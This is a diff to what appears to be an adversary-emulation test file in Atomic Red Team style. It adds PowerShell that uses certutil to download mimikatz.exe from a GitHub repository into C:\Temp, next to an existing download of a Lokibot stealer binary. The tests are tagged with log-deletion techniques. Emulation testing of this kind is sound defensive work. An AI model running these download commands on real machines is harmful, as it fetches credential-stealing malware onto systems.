@@ -87,13 +87,20 @@ atomic_tests:
         $mimikatz_url = "https://github.com/Da2dalus/The-MALWARE-Repo/blob/master/Stealer/Lokibot.exe"
         $mimikatz_path = "C:\Temp\Lokibot.exe"
 
+        Write-Host "[*] Downloading Mimikatz using certutil..."
+        $mimikatz1_url = "https://raw.githubusercontent.com/khanzjob/cyber-drill/main/mimikatz.exe"
+        $mimikatz1_path = "C:\Temp\Mimikatz.exe"
+
         # Create the folder if it doesn't exist
         New-Item -Path "C:\Temp" -ItemType Directory -Force
 
         # Use certutil properly (note: no variables inside certutil, use string expansion)
         certutil -urlcache -split -f $mimikatz_url $mimikatz_path
+        certutil -urlcache -split -f $mimikatz1_url $mimikatz1_path
 
         Write-Host "[+] Mimikatz downloaded to $mimikatz_path"
+        Write-Host "[+] Mimikatz1 downloaded to $mimikatz1_path"
+
       
         Remove-Item "C:\Temp\mimikat.zip" -Force -ErrorAction SilentlyContinue
     attack_technique:
@@ -237,6 +244,7 @@ atomic_tests:
     attack_technique:
       - T1070.001
       - T1070.004
+
 
 
 
